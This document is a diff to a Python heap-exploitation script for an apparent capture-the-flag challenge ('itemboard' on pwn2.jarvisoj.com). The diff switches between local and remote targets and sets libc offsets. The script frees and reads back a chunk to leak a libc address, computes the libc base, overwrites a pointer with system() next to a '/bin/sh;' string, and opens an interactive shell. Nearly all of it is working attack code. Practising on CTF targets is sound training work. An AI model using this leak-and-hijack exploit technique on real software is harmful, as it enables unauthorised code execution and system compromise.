@@ -11,9 +11,16 @@ import sys
 #  def DEBUG():
     #  print pidof(io)[0]
     #  raw_input("DEBUG: ")
+if sys.argv[1] == 'l':
+    conn = './itemboard'
+    main_arena = 0x399b00
+    sysAddr = 0x3f450
+else:
+    conn = ('pwn2.jarvisoj.com', 9887)
+    main_arena = 0x3be760
+    sysAddr = 0x46590
 
-conn = "./itemboard" if sys.argv[1] == "l" else ('pwn2.jarvisoj.com', 9887)
-io = zio(('pwn2.jarvisoj.com', 9887), timeout = 10000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'green'))
+io = zio(conn, timeout = 10000, print_read = COLORED(RAW, 'magenta'), print_write = COLORED(RAW, 'green'))
 
 def add(name, length, des):
     io.read_until(":\n")
@@ -43,7 +50,7 @@ if __name__ == '__main__':
     remove(0)
     show(0)
 
-    libcBase = b64(io.read_until('\x7f')[-6: ].ljust(8, '\x00')[::-1]) - 88 - 0x3be760
+    libcBase = b64(io.read_until('\x7f')[-6: ].ljust(8, '\x00')[::-1]) - 88 - main_arena
     print "[*]libcBase -> {:#x}".format(libcBase)
     raw_input("")
 
@@ -52,9 +59,10 @@ if __name__ == '__main__':
     remove(2)
     remove(3)
 
-    add('eeee', 24, '/bin/sh;' + 'eeeeeeee' + l64(libcBase + 0x46590))
+    add('eeee', 24, '/bin/sh;' + 'eeeeeeee' + l64(libcBase + sysAddr))
     remove(2)
 
+    print "[*]get shell!"
     io.interact()
     io.close()
 
